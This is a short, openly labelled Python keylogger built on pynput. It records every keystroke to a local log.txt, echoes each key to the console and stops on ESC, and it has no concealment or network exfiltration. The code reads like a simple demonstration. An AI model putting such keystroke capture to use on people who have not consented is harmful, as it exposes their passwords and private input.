from pynput.keyboard import Key, Listener

def record_keystroke(key):
    # Determine if the key is alphanumeric or a special key
    try:
        keystroke = key.char
        print(f'Alphanumeric key pressed: {keystroke}')
    except AttributeError:
        if key == Key.esc:
            return False  # Stop listener on pressing ESC
        keystroke = str(key)
        print(f'Special key pressed: {keystroke}')
    
    # Log the key to the file
    log_file_path = 'log.txt'
    with open(log_file_path, 'a') as log_file:
        log_file.write(keystroke + '\n')
        print(f'Logged to file: {keystroke}')

print('Starting keylogger...')
# Set up the listener for keyboard events and start listening
with Listener(on_press=record_keystroke) as listener:
    listener.join()
print('Keylogger stopped.')
